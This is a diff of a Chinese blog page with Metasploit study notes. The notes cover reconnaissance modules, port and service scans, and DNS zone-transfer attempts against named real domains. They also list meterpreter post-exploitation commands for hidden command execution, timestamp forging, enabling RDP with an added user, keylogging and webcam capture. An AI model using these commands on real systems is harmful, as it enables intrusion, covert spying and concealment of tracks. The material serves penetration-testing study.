@@ -16,7 +16,7 @@
 <meta property="og:description" content="MSF学习MSF介绍全名The Metasploit Framework 即漏洞框架 ，自带攻击工具 MSF术语 exploit &amp;emsp;&amp;emsp;&amp;emsp;攻击行为 payloads&amp;emsp;&amp;emsp;&amp;emsp;攻击载荷即攻击代码 shellcode&amp;emsp;&amp;emsp;&amp;emsp;溢出代码即攻击载荷运行的攻击机器指令 module &amp;emsp;&amp;emsp;&amp;emsp;也就是软件">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-06T04:24:31.537Z">
-<meta property="article:modified_time" content="2020-04-12T11:42:45.590Z">
+<meta property="article:modified_time" content="2020-04-14T03:41:23.726Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -368,9 +368,10 @@
 </ol>
 <h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p>
 <h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><p>1.Auxiliary模块，情报搜集阶段<br>   可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br>   ip地址详细信息查询，whois 114.114.114.114<br>   利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br>   或者使用枚举 use auxiliary/gather/enum_dns<br>   set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可<br>2.端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br>使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br>（3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads<br>3.服务版本信息检测<br>   1（smb）<br>   服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br>   使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>   2(SSH版本扫描)<br>   SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>   使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>   3(FTP)版本扫描<br>  文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>   使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p>
-<h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><ol>
+<h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><p><font color = red>注意，后面的所有方法都是建立在获取了meterpreter shell之后的操作</font></p>
+<ol>
 <li>上传文件到windows主机 命令upload &lt;文件名称&gt; &lt;路径&gt;        </li>
-<li>下载主机上的文件 download <file> &lt;保存路径&gt;<font color = red>注意windows路径要使用下划线</font>   </li>
+<li>下载主机上的文件 download <file> &lt;保存路径&gt;<font color = red>注意windows路径要使用双下划//</font>   </li>
 <li>在靶机上执行exe文件 ：execute -f &lt;路径&gt;  </li>
 <li>创建cmd新通道,即在靶机上执行命令提示符 execute -f cmd -c </li>
 <li>显示进程 ： ps  </li>
@@ -386,6 +387,28 @@
 <li>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </li>
 </ol>
 <p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt<br>18.enable_rdp脚本开启3389<br> run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME = www2 PASSWORD = 123456 #  添加用户<br>run post/windows/manage/enable_rdp FORWARD = true LPORT = 6662 #将3389端口转发到6662<br>19.键盘记录<br>  keyscan_start ：开始键盘记录<br>  keyscan_dump：到处记录数据<br>  keyscan_stop:结束键盘记录</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h4 id="步骤1-首先进行漏洞扫描，"><a href="#步骤1-首先进行漏洞扫描，" class="headerlink" title="步骤1.首先进行漏洞扫描，"></a>步骤1.首先进行漏洞扫描，</h4><p>如果无漏洞再进行信息搜集完成渗透。  </p>
+<h4 id="2-子域名探测。"><a href="#2-子域名探测。" class="headerlink" title="2.子域名探测。"></a>2.子域名探测。</h4><p>根据主域名，可以获取二级域名，三级域名…<br>真正的一级域名是由一个合法的字符串+域名后缀组成，所以，lisp.com这种形式的域名才是一级域名，lisp是域名主体，.com是域名后缀，可以是.net也是域名后缀  所谓的二级域名实际就是一个一级域名下面的主机名，顾名思义，它是在一级域名前面加上一个字符串，比如asdx.lisp.com，它可以拥有与根顶级域名同样的功能，并且通过设置，可以拥有和跟顶级域名完全一样的功能<br>主要方法(1)dns域传送漏洞<br>dns传送漏洞原理</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/itest_2016/java/article" target="_blank" rel="noopener">https://blog.csdn.net/itest_2016/java/article</a> details/78057445dnsenum oldboydu.com      </p>
+</blockquote>
+<p>例<code>dnsenum oldboyedu.com -f /dns.txt --dnsserver 114.114.114.114</code><br>说明：dnsenum 的目的是尽可能搜集一个域的信息可查询主机地址，域名服务器，mx record ,在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件。上面一系列操作都是dnsenum执行的  </p>
+<p>-h    查看工具使用帮助</p>
+<p>–dnsserver    <server>    指定域名服务器</p>
+<p>–enum    快捷选项，相当于”–threads 5 -s 15 -w”</p>
+<p>–noreverse    跳过反向查询操作</p>
+<p>–nocolor 无彩色输出</p>
+<p>–private 显示并在”domain_ips.txt”文件结尾保存私有的 ips</p>
+<p>–subfile <file> 写入所有有效的子域名到指定文件</p>
+<p>-t, –timeout <value>    tcp 或者 udp 的连接超时时间，默认为 10s（时间单位：秒）</p>
+<p>–threads <value> 查询线程数</p>
+<p>-v, –verbose    显示所有的进度和错误消息</p>
+<p>-o ,–output <file> 输出选项，将输出信息保存到指定文件</p>
+<p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的 PTR</p>
+<p>记录，在排查无效主机上非常有用</p>
+<p>-w, –whois    在一个 C 段网络地址范围提供whois 查询</p>
+<p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p>
+<p> <code>dig axfr @axfr @ns5.csc108.com |more</code><br>dig命令是常用的域名查询工具，用来检测域名是否正常<br>参数1 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>2 -b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>3 -f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>4 -P：指定域名服务器所使用端口号；<br>5 -t&lt;类型&gt;：指定要查询的DNS数据类型；<br>6 -x&lt;IP地址&gt;：执行逆向域名查询；<br>7 -4：使用IPv4；<br>8 -6：使用IPv6；<br>9 -h：显示指令帮助信息。<br> (2) 通过系统域名备案号，再反查备案号相关的域名地址 http:<a href="http://www.beianhao.com" target="_blank" rel="noopener">www.beianhao.com</a><br> (3)ssL证书，通过查询SSL证书，获取域名 <a href="https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html" target="_blank" rel="noopener">https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html</a><br> (4)google 搜索C段<br>比如在：127.127.127.4 这个 IP 上面有一个网站 127.4 这个服务器上面有网站我 们 可 以 想 想 .. 他 是 一 个 非 常 大 的 站 几 乎 没 什 么 漏 洞 ！ 但 是 在 他 同 C 段127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255 任何一个站 之后提权来嗅探得到 127.4 这台服务器的密码 甚至3389 连接的密码后台登录的密码 如果运气好会得到很多的密码，C段就是127.127.127.1-127.127.127.255 B段就是127.127.0.0-127.127.255.255<br>（5）APP提取<br>（6）微信公众号<br>（7）字典枚举<br>参考后面的Burp app抓包<br> （8）公开dns源<br>Rapid7 下 Sonar 项目发布的： <a href="https://scans.io/study/sonar.fdns_v2。DNS" target="_blank" rel="noopener">https://scans.io/study/sonar.fdns_v2。DNS</a> 历史解析：    <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>（9）威胁情报查询<br>华为安全情报 <a href="https://isecurity.huawei.com" target="_blank" rel="noopener">https://isecurity.huawei.com</a>  </p>
 
       
 
